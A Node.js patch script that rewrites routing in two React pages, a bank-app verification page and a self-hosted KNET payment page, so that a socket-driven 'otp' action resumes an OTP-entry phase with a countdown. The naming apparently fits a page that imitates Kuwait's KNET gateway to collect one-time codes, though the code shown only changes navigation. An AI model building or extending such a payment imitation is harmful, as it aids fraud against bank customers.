import fs from "fs";
const bp="src/pages/BankAppVerification.tsx";
let b=fs.readFileSync(bp,"utf8").replace(/\r\n/g,"\n");

const a1='      if (action === "otp") { navigate(isKnet ? "/otp-verification" : "/otp-verification"); }';
if(!b.includes(a1)){console.log("A1 FAIL");process.exit(1);}
b=b.replace(a1,'      if (action === "otp") { if (isKnet) { localStorage.setItem("knetPhase", "otp"); navigate("/knet"); } else { navigate("/otp-verification"); } }');

const a2='navigate(localStorage.getItem("flowType") === "knet" ? "/otp-verification" : "/otp-verification");';
if(!b.includes(a2)){console.log("A2 FAIL");process.exit(1);}
b=b.replace(a2,'if (localStorage.getItem("flowType") === "knet") { localStorage.setItem("knetPhase", "otp"); navigate("/knet"); } else { navigate("/otp-verification"); }');
fs.writeFileSync(bp,b,"utf8");

const kp="src/pages/KNETPayment.tsx";
let k=fs.readFileSync(kp,"utf8").replace(/\r\n/g,"\n");
if(!k.includes("knetPhase")){
  const anchor="  // Direct socket action handler";
  if(!k.includes(anchor)){console.log("K ANCHOR FAIL");process.exit(1);}
  const blk=`  // Resume OTP phase after coming back from bank app page
  useEffect(() => {
    if (localStorage.getItem("knetPhase") === "otp") {
      localStorage.removeItem("knetPhase");
      setPhase("otp");
      startCountdown();
    }
  }, []);

`;
  k=k.replace(anchor, blk+anchor);
  fs.writeFileSync(kp,k,"utf8");
}
console.log("KNET RESUME OK");
